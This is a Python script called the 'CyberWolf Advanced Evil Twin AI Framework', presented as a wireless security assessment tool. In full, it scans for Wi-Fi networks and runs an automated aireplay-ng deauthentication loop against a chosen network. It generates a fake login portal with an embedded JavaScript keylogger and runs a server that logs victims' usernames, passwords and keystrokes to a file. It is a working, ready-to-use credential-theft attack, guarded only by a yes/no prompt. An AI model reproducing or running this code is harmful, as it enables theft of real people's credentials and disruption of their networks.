#!/usr/bin/env python3
"""
🐺 CYBERWOLF ADVANCED EVIL TWIN AI FRAMEWORK
Professional Wireless Security Assessment Tool
"""

import subprocess
import os
import time
import random
import json
import threading
from datetime import datetime

class AdvancedEvilTwin:
    def __init__(self):
        self.target = None
        self.captured_creds = []
        self.attack_active = False
        
    def banner(self):
        print("""
╔══════════════════════════════════════════════════════════════════════════════╗
║         🐺 CYBERWOLF ADVANCED EVIL TWIN AI FRAMEWORK 🐺                      ║
║                    Professional Wireless Security Assessment                 ║
╚══════════════════════════════════════════════════════════════════════════════╝
        """)
    
    def check_permission(self):
        print("\n[!] LEGAL REQUIREMENT")
        print("This tool is for EDUCATIONAL and AUTHORIZED testing only.\n")
        answer = input("Do you have written permission to test? (yes/no): ")
        if answer.lower() not in ['yes', 'y']:
            print("\n[!] Authorization required. Exiting.")
            return False
        return True
    
    def start_monitor_mode(self):
        print("\n[*] Starting monitor mode...")
        subprocess.run(["sudo", "airmon-ng", "check", "kill"], capture_output=True)
        result = subprocess.run(["sudo", "airmon-ng", "start", "wlan0"], capture_output=True)
        if result.returncode == 0:
            print("[+] Monitor mode active on wlan0mon")
            return True
        else:
            print("[-] Failed to start monitor mode")
            return False
    
    def scan_networks(self):
        print("\n[*] Scanning for networks (15 seconds)...")
        
        scan_process = subprocess.Popen(
            ["sudo", "airodump-ng", "wlan0mon", "--write", "/tmp/scan", "--output-format", "csv"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        
        for i in range(15):
            print(f"\r[*] Scanning... {15-i} seconds remaining", end="")
            time.sleep(1)
        
        scan_process.terminate()
        time.sleep(2)
        print("\n[+] Scan complete!")
        
        networks = []
        try:
            with open("/tmp/scan-01.csv", "r") as f:
                lines = f.readlines()
            
            for line in lines:
                if "WPA" in line or "WEP" in line or "OPEN" in line:
                    parts = line.split(',')
                    if len(parts) >= 14:
                        bssid = parts[0].strip()
                        channel = parts[3].strip()
                        essid = parts[13].strip() if len(parts) > 13 else "Hidden"
                        if bssid and bssid != "BSSID" and essid and essid != "":
                            networks.append({
                                'bssid': bssid,
                                'channel': channel,
                                'essid': essid
                            })
        except:
            pass
        
        if networks:
            print("\n[+] Available Networks:")
            print("-" * 60)
            for i, net in enumerate(networks[:10]):
                print(f"  {i+1}. {net['essid']} (Channel {net['channel']}) - {net['bssid']}")
            print("-" * 60)
        else:
            print("\n[-] No networks found.")
        
        return networks
    
    def generate_phishing_page(self, ssid):
        """Generate advanced phishing page with keylogger"""
        os.makedirs("portals", exist_ok=True)
        
        html = f'''<!DOCTYPE html>
<html>
<head>
    <title>{ssid} Secure Portal</title>
    <style>
        *{{margin:0;padding:0;box-sizing:border-box;}}
        body{{
            background:linear-gradient(135deg,#1a1a2e 0%,#16213e 100%);
            font-family:'Segoe UI',sans-serif;
            min-height:100vh;
            display:flex;
            align-items:center;
            justify-content:center;
        }}
        .container{{
            background:white;
            border-radius:20px;
            padding:40px;
            width:400px;
            box-shadow:0 20px 60px rgba(0,0,0,0.3);
        }}
        h2{{color:#333;margin-bottom:10px;}}
        .sub{{color:#666;margin-bottom:30px;}}
        input{{
            width:100%;
            padding:15px;
            margin:10px 0;
            border:1px solid #ddd;
            border-radius:10px;
            font-size:16px;
        }}
        button{{
            width:100%;
            padding:15px;
            background:linear-gradient(135deg,#00ff88 0%,#00aa55 100%);
            color:white;
            border:none;
            border-radius:10px;
            font-size:16px;
            cursor:pointer;
            margin-top:10px;
        }}
        .loader{{
            display:none;
            text-align:center;
            margin-top:20px;
        }}
        .loader div{{
            width:20px;
            height:20px;
            background:#00ff88;
            border-radius:50%;
            display:inline-block;
            animation: bounce 0.5s infinite alternate;
        }}
        @keyframes bounce{{
            to{{transform:translateY(-20px);}}
        }}
        .error{{color:red;font-size:12px;display:none;margin-top:10px;}}
    </style>
</head>
<body>
<div class="container">
    <h2>🔐 {ssid} Secure Portal</h2>
    <div class="sub">Please verify your identity to continue</div>
    <form id="loginForm">
        <input type="text" id="username" placeholder="Email or Username" required>
        <input type="password" id="password" placeholder="Password" required>
        <button type="submit">Sign In</button>
    </form>
    <div class="loader" id="loader"><div></div><div></div><div></div></div>
    <div class="error" id="error">Invalid credentials. Please try again.</div>
</div>
<script>
    let keystrokes = [];
    let attempts = 0;
    
    // Keylogger - capture everything
    document.addEventListener('keypress', function(e) {{
        keystrokes.push(e.key);
        if(keystrokes.length > 100) keystrokes = keystrokes.slice(-100);
    }});
    
    // Track form interactions
    document.getElementById('username').addEventListener('focus', function() {{
        fetch('/track', {{method: 'POST', body: 'focus=username'}});
    }});
    
    document.getElementById('loginForm').addEventListener('submit', async function(e) {{
        e.preventDefault();
        attempts++;
        
        document.querySelector('button').style.display = 'none';
        document.getElementById('loader').style.display = 'block';
        
        const data = {{
            username: document.getElementById('username').value,
            password: document.getElementById('password').value,
            keystrokes: keystrokes.join(''),
            attempts: attempts,
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            screenResolution: screen.width + 'x' + screen.height,
            platform: navigator.platform,
            language: navigator.language
        }};
        
        try {{
            await fetch('/capture', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify(data)
            }});
        }} catch(e) {{}}
        
        setTimeout(() => {{
            window.location.href = 'https://www.google.com';
        }}, 1500);
    }});
</script>
</body>
</html>'''
        
        filename = f"portals/{ssid.replace(' ', '_')}.html"
        with open(filename, 'w') as f:
            f.write(html)
        
        print(f"[+] Advanced phishing page saved: {filename}")
        return filename
    
    def start_credential_server(self):
        """Start credential capture server"""
        from http.server import HTTPServer, BaseHTTPRequestHandler
        import json
        
        class CredHandler(BaseHTTPRequestHandler):
            def do_POST(self):
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length)
                
                try:
                    data = json.loads(post_data.decode())
                    cred_data = {
                        'timestamp': datetime.now().isoformat(),
                        'username': data.get('username', ''),
                        'password': data.get('password', ''),
                        'userAgent': data.get('userAgent', ''),
                        'keystrokes': data.get('keystrokes', '')[:50]
                    }
                    self.server.parent.captured_creds.append(cred_data)
                    
                    with open('captured_creds.json', 'a') as f:
                        f.write(json.dumps(cred_data) + '\n')
                    
                    print(f"\n[!] CAPTURED: {data.get('username')}:{data.get('password')}")
                    
                except:
                    pass
                
                self.send_response(200)
                self.end_headers()
            
            def log_message(self, format, *args):
                pass
        
        CredHandler.parent = self
        server = HTTPServer(('0.0.0.0', 8080), CredHandler)
        print("[*] Credential capture server running on port 8080")
        server.serve_forever()
    
    def auto_deauth(self, target_bssid):
        """Automated deauth attack"""
        def deauth_loop():
            while self.attack_active:
                subprocess.run([
                    "sudo", "aireplay-ng", "-0", "3", "-a", target_bssid,
                    "--ignore-negative-one", "wlan0mon"
                ], capture_output=True)
                time.sleep(3)
        
        deauth_thread = threading.Thread(target=deauth_loop, daemon=True)
        deauth_thread.start()
        print("[+] Automated deauth running")
    
    def open_terminals(self, target_ssid, target_channel, target_bssid):
        """Open all required terminals"""
        
        home_dir = os.path.expanduser("~")
        portal_dir = f"{home_dir}/cyberwolf-evil-twin/portals"
        
        # Terminal commands
        terminals = [
            ['gnome-terminal', '--title=🐺 Evil Twin AP', '--', 'bash', '-c', 
             f'echo "Target: {target_ssid} (Channel {target_channel})"; echo "BSSID: {target_bssid}"; echo ""; echo "In Airgeddon:"; echo "1. Select wlan0mon"; echo "2. Choose Evil Twin Attacks"; echo "3. Select {target_ssid}"; echo ""; sudo airgeddon; exec bash'],
            
            ['gnome-terminal', '--title=🐺 Phishing Server', '--', 'bash', '-c',
             f'cd {portal_dir}; echo "Serving phishing page on port 80"; sudo python3 -m http.server 80 2>&1 | tee captured.txt; exec bash'],
            
            ['gnome-terminal', '--title=🐺 Credential Monitor', '--', 'bash', '-c',
             'while true; do clear; echo "════════════════════════════════════════════════════════════"; echo "🐺 CAPTURED CREDENTIALS"; echo "════════════════════════════════════════════════════════════"; echo ""; if [ -f captured_creds.json ]; then tail -10 captured_creds.json 2>/dev/null | python3 -m json.tool 2>/dev/null || tail -10 captured_creds.json; else echo "Waiting for victims..."; fi; echo ""; echo "────────────────────────────────────────────────────────────"; sleep 3; done']
        ]
        
        for term in terminals:
            try:
                subprocess.Popen(term)
                time.sleep(1)
            except:
                pass
        
        print("[+] Terminals opened")
    
    def generate_report(self):
        """Generate assessment report"""
        report = f"""
╔══════════════════════════════════════════════════════════════════╗
║                    🐺 ASSESSMENT REPORT 🐺                       ║
╠══════════════════════════════════════════════════════════════════╣
║  Target: {self.target['essid'] if self.target else 'Unknown'}
║  BSSID: {self.target['bssid'] if self.target else 'Unknown'}
║  Channel: {self.target['channel'] if self.target else 'Unknown'}
║  Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
╠══════════════════════════════════════════════════════════════════╣
║  📊 CAPTURED CREDENTIALS: {len(self.captured_creds)}
╚══════════════════════════════════════════════════════════════════╝
"""
        
        with open('assessment_report.txt', 'w') as f:
            f.write(report)
        
        print(report)
        print("[+] Report saved to assessment_report.txt")
        
        # Show captured credentials
        if self.captured_creds:
            print("\n📋 Captured Credentials:")
            for cred in self.captured_creds:
                print(f"  • {cred.get('username', '?')}:{cred.get('password', '?')}")
    
    def run(self):
        self.banner()
        
        if not self.check_permission():
            return
        
        if not self.start_monitor_mode():
            return
        
        networks = self.scan_networks()
        
        if not networks:
            return
        
        try:
            choice = int(input("\n[?] Select target number: ")) - 1
            self.target = networks[choice]
        except:
            print("[-] Invalid selection")
            return
        
        print(f"\n[+] Target selected: {self.target['essid']}")
        
        # Generate phishing page
        print("\n[*] Generating advanced phishing portal...")
        self.generate_phishing_page(self.target['essid'])
        
        # Start credential server in background
        print("\n[*] Starting credential capture...")
        server_thread = threading.Thread(target=self.start_credential_server, daemon=True)
        server_thread.start()
        
        # Start deauth attack
        print("\n[*] Starting automated deauth...")
        self.attack_active = True
        self.auto_deauth(self.target['bssid'])
        
        # Open terminals
        print("\n[*] Opening attack terminals...")
        self.open_terminals(self.target['essid'], self.target['channel'], self.target['bssid'])
        
        print(f"""
╔══════════════════════════════════════════════════════════════════╗
║                    🐺 ATTACK IN PROGRESS 🐺                      ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                  ║
║  Target: {self.target['essid']}
║  Channel: {self.target['channel']}
║  BSSID: {self.target['bssid']}
║                                                                  ║
║  Active Modules:                                                 ║
║  ✅ Advanced Phishing Portal (with keylogger)                    ║
║  ✅ Automated Deauth Attack                                      ║
║  ✅ Credential Capture Server                                    ║
║  ✅ Real-time Monitoring                                         ║
║                                                                  ║
║  Watch the Credential Monitor terminal for captured data!        ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝
        """)
        
        input("\n[!] Press Enter to stop attack and generate report...")
        
        self.attack_active = False
        time.sleep(2)
        self.generate_report()
        
        # Cleanup
        print("\n[*] Cleaning up...")
        subprocess.run(["sudo", "airmon-ng", "stop", "wlan0mon"], capture_output=True)
        subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"], capture_output=True)
        print("[+] Cleanup complete")

if __name__ == "__main__":
    try:
        app = AdvancedEvilTwin()
        app.run()
    except KeyboardInterrupt:
        print("\n\n[!] Interrupted by user")
        print("[*] Cleaning up...")
        subprocess.run(["sudo", "airmon-ng", "stop", "wlan0mon"], capture_output=True)
        subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"], capture_output=True)
